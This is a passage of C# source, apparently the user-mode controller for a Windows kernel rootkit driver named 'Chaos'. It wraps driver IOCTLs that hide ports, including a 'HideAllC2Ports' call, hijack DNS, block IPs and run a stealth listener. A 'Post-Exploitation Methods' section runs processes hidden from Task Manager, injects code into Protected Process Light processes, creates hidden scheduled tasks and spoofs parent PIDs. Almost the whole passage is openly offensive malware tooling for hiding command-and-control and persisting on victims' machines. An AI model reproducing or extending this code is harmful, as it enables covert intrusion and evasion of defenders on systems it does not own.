                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to unload driver: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        // ================================================================
        // Boot Diagnostics Methods
        // ================================================================

        public (bool Success, BootDiagnostics Diagnostics, string Message) GetBootDiagnostics()
        {
            if (!IsConnected)
                return (false, default, "Not connected to driver");

            int bufferSize = Marshal.SizeOf<BootDiagnostics>();
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);
            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.GET_BOOT_PROTECTION_STATUS,
                    IntPtr.Zero, 0,
                    buffer, (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success && bytesReturned >= bufferSize)
                {
                    var diag = Marshal.PtrToStructure<BootDiagnostics>(buffer);
                    return (true, diag, "Diagnostics retrieved");
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return (false, default, $"IOCTL failed: {error}");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        // ================================================================
        // Networking Methods
        // ================================================================

        public IoctlResult HidePort(ushort port, bool isTcp)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new PortRequest { Port = port, IsTcp = isTcp };
            int size = Marshal.SizeOf<PortRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.HIDE_PORT,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"Port {port} hidden" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to hide port: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult UnhidePort(ushort port, bool isTcp)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new PortRequest { Port = port, IsTcp = isTcp };
            int size = Marshal.SizeOf<PortRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.UNHIDE_PORT,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"Port {port} unhidden" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to unhide port: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult HideAllC2Ports() => SendIoctl(ChaosIoctl.HIDE_ALL_C2);

        public IoctlResult AddDnsRule(string domain, uint redirectIp)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new DnsRequest { Domain = domain, RedirectIp = redirectIp };
            int size = Marshal.SizeOf<DnsRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.ADD_DNS_RULE,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"DNS rule added for {domain}" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to add DNS rule: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult RemoveDnsRule(string domain)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new DnsRequest { Domain = domain, RedirectIp = 0 };
            int size = Marshal.SizeOf<DnsRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.REMOVE_DNS_RULE,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"DNS rule removed for {domain}" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to remove DNS rule: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult BlockIp(uint ip, ushort port)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new IpRequest { Ip = ip, Port = port };
            int size = Marshal.SizeOf<IpRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.BLOCK_IP,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"IP blocked" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to block IP: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult UnblockIp(uint ip, ushort port)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new IpRequest { Ip = ip, Port = port };
            int size = Marshal.SizeOf<IpRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.UNBLOCK_IP,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"IP unblocked" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to unblock IP: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult StartStealthListener(ushort port)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            int bufferSize = sizeof(int) * 2; // ushort input + int output
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);
            try
            {
                Marshal.WriteInt16(buffer, (short)port);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.START_STEALTH_LISTENER,
                    buffer,
                    sizeof(ushort),
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"Stealth listener started on port {port}" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"Failed to start listener: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        public IoctlResult StopStealthListener() => SendIoctl(ChaosIoctl.STOP_STEALTH_LISTENER);

        /// <summary>
        /// Get all DNS hijack rules from the driver
        /// </summary>
        public (bool Success, DnsRule[] Rules, string Message) GetDnsRules()
        {
            if (!IsConnected)
                return (false, Array.Empty<DnsRule>(), "Not connected to driver");

            const int MAX_DNS_RULES = 32;
            int ruleSize = Marshal.SizeOf<DnsRule>();
            int bufferSize = ruleSize * MAX_DNS_RULES;
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.GET_DNS_RULES,
                    IntPtr.Zero,
                    0,
                    buffer,
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success && bytesReturned > 0)
                {
                    var rules = new DnsRule[MAX_DNS_RULES];
                    for (int i = 0; i < MAX_DNS_RULES; i++)
                    {
                        IntPtr ptr = IntPtr.Add(buffer, i * ruleSize);
                        rules[i] = Marshal.PtrToStructure<DnsRule>(ptr);
                    }
                    return (true, rules, "DNS rules retrieved");
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return (false, Array.Empty<DnsRule>(), $"IOCTL failed: {error}");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Get all blocked IPs from the driver
        /// </summary>
        public (bool Success, BlockedIp[] Rules, string Message) GetBlockedIps()
        {
            if (!IsConnected)
                return (false, Array.Empty<BlockedIp>(), "Not connected to driver");

            const int MAX_BLOCKED_IPS = 64;
            int ruleSize = Marshal.SizeOf<BlockedIp>();
            int bufferSize = ruleSize * MAX_BLOCKED_IPS;
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.GET_BLOCKED_IPS,
                    IntPtr.Zero,
                    0,
                    buffer,
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success && bytesReturned > 0)
                {
                    var rules = new BlockedIp[MAX_BLOCKED_IPS];
                    for (int i = 0; i < MAX_BLOCKED_IPS; i++)
                    {
                        IntPtr ptr = IntPtr.Add(buffer, i * ruleSize);
                        rules[i] = Marshal.PtrToStructure<BlockedIp>(ptr);
                    }
                    return (true, rules, "Blocked IPs retrieved");
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return (false, Array.Empty<BlockedIp>(), $"IOCTL failed: {error}");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Get all hidden ports from the driver
        /// </summary>
        public (bool Success, HiddenPort[] Rules, string Message) GetHiddenPorts()
        {
            if (!IsConnected)
                return (false, Array.Empty<HiddenPort>(), "Not connected to driver");

            const int MAX_HIDDEN_PORTS = 64;
            int ruleSize = Marshal.SizeOf<HiddenPort>();
            int bufferSize = ruleSize * MAX_HIDDEN_PORTS;
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.GET_HIDDEN_PORTS,
                    IntPtr.Zero,
                    0,
                    buffer,
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success && bytesReturned > 0)
                {
                    var rules = new HiddenPort[MAX_HIDDEN_PORTS];
                    for (int i = 0; i < MAX_HIDDEN_PORTS; i++)
                    {
                        IntPtr ptr = IntPtr.Add(buffer, i * ruleSize);
                        rules[i] = Marshal.PtrToStructure<HiddenPort>(ptr);
                    }
                    return (true, rules, "Hidden ports retrieved");
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return (false, Array.Empty<HiddenPort>(), $"IOCTL failed: {error}");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        #endregion

        #region Networking Structures

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PortRequest
        {
            public ushort Port;
            [MarshalAs(UnmanagedType.I1)]
            public bool IsTcp;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DnsRequest
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string Domain;
            public uint RedirectIp;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IpRequest
        {
            public uint Ip;
            public ushort Port;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DriverUnloadRequest
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string DriverName;
        }

        #endregion

        #region Post-Exploitation Methods

        /// <summary>
        /// Run a hidden process that's invisible to Task Manager
        /// </summary>
        public (bool Success, string Message) RunHiddenProcess(RunHiddenRequest request)
        {
            if (!IsConnected)
                return (false, "Not connected to driver");

            int size = Marshal.SizeOf<RunHiddenRequest>();
            IntPtr buffer = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(request, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.RUN_HIDDEN_PROCESS,
                    buffer,
                    (uint)size,
                    IntPtr.Zero,
                    0,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                    return (true, $"Hidden {request.PayloadType} launched successfully");
                else
                    return (false, $"IOCTL failed: {Marshal.GetLastWin32Error()}");
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Get all hidden processes from the driver
        /// </summary>
        public (bool Success, HiddenProcess[] Processes, string Message) GetHiddenProcesses()
        {
            if (!IsConnected)
                return (false, Array.Empty<HiddenProcess>(), "Not connected to driver");

            const int MAX_HIDDEN_PROCESSES = 32;
            int procSize = Marshal.SizeOf<HiddenProcess>();
            int bufferSize = procSize * MAX_HIDDEN_PROCESSES;
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.LIST_HIDDEN_PROCESSES,
                    IntPtr.Zero,
                    0,
                    buffer,
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success && bytesReturned > 0)
                {
                    var processes = new HiddenProcess[MAX_HIDDEN_PROCESSES];
                    for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
                    {
                        IntPtr ptr = IntPtr.Add(buffer, i * procSize);
                        processes[i] = Marshal.PtrToStructure<HiddenProcess>(ptr);
                    }
                    return (true, processes, "Hidden processes retrieved");
                }
                else
                {
                    return (false, Array.Empty<HiddenProcess>(), $"IOCTL failed: {Marshal.GetLastWin32Error()}");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Kill a hidden process
        /// </summary>
        public (bool Success, string Message) KillHiddenProcess(uint pid)
        {
            if (!IsConnected)
                return (false, "Not connected to driver");

            IntPtr buffer = Marshal.AllocHGlobal(sizeof(uint));
            try
            {
                Marshal.WriteInt32(buffer, (int)pid);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.KILL_HIDDEN_PROCESS,
                    buffer,
                    sizeof(uint),
                    IntPtr.Zero,
                    0,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                    return (true, $"Hidden process {pid} terminated");
                else
                    return (false, $"IOCTL failed: {Marshal.GetLastWin32Error()}");
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Inject code into a Protected Process Light
        /// </summary>
        public (bool Success, string Message) InjectIntoPPL(PplInjectRequest request)
        {
            if (!IsConnected)
                return (false, "Not connected to driver");

            int size = Marshal.SizeOf<PplInjectRequest>();
            IntPtr buffer = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(request, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.INJECT_INTO_PPL,
                    buffer,
                    (uint)size,
                    IntPtr.Zero,
                    0,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                    return (true, "PPL injection successful");
                else
                    return (false, $"IOCTL failed: {Marshal.GetLastWin32Error()}");
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Create a hidden scheduled task
        /// </summary>
        public (bool Success, string Message) CreateHiddenTask(CreateHiddenTaskRequest request)
        {
            if (!IsConnected)
                return (false, "Not connected to driver");

            int size = Marshal.SizeOf<CreateHiddenTaskRequest>();
            IntPtr buffer = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(request, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.CREATE_HIDDEN_TASK,
                    buffer,
                    (uint)size,
                    IntPtr.Zero,
                    0,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                    return (true, $"Hidden task '{request.TaskName}' created");
                else
                    return (false, $"IOCTL failed: {Marshal.GetLastWin32Error()}");
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Get all hidden tasks from the driver
        /// </summary>
        public (bool Success, HiddenTask[] Tasks, string Message) GetHiddenTasks()
        {
            if (!IsConnected)
                return (false, Array.Empty<HiddenTask>(), "Not connected to driver");

            const int MAX_HIDDEN_TASKS = 32;
            int taskSize = Marshal.SizeOf<HiddenTask>();
            int bufferSize = taskSize * MAX_HIDDEN_TASKS;
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.LIST_HIDDEN_TASKS,
                    IntPtr.Zero,
                    0,
                    buffer,
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success && bytesReturned > 0)
                {
                    var tasks = new HiddenTask[MAX_HIDDEN_TASKS];
                    for (int i = 0; i < MAX_HIDDEN_TASKS; i++)
                    {
                        IntPtr ptr = IntPtr.Add(buffer, i * taskSize);
                        tasks[i] = Marshal.PtrToStructure<HiddenTask>(ptr);
                    }
                    return (true, tasks, "Hidden tasks retrieved");
                }
                else
                {
                    return (false, Array.Empty<HiddenTask>(), $"IOCTL failed: {Marshal.GetLastWin32Error()}");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Delete a hidden scheduled task
        /// </summary>
        public (bool Success, string Message) DeleteHiddenTask(string taskName)
        {
            if (!IsConnected)
                return (false, "Not connected to driver");

            // Allocate buffer for task name (MAX_TASK_NAME_LEN = 256 chars)
            int bufferSize = 256 * sizeof(char);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.Copy(taskName.ToCharArray(), 0, buffer, Math.Min(taskName.Length, 255));
                Marshal.WriteInt16(buffer, Math.Min(taskName.Length, 255) * sizeof(char), 0); // Null terminator

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.DELETE_HIDDEN_TASK,
                    buffer,
                    (uint)bufferSize,
                    IntPtr.Zero,
                    0,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                    return (true, $"Hidden task '{taskName}' deleted");
                else
                    return (false, $"IOCTL failed: {Marshal.GetLastWin32Error()}");
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Spawn a process with spoofed parent PID
        /// </summary>
        public (bool Success, string Message) SpawnWithPpid(SpawnPpidRequest request)
        {
            if (!IsConnected)
                return (false, "Not connected to driver");

            int size = Marshal.SizeOf<SpawnPpidRequest>();
            IntPtr buffer = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(request, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.SPAWN_WITH_PPID,
                    buffer,
                    (uint)size,
                    IntPtr.Zero,
                    0,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                    return (true, $"Process spawned with fake parent PID {request.FakeParentPid}");
                else
                    return (false, $"IOCTL failed: {Marshal.GetLastWin32Error()}");
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        #endregion

        public void Dispose()
        {
            if (!_disposed)
            {
                Disconnect();
                _disposed = true;
            }
        }
    }
}
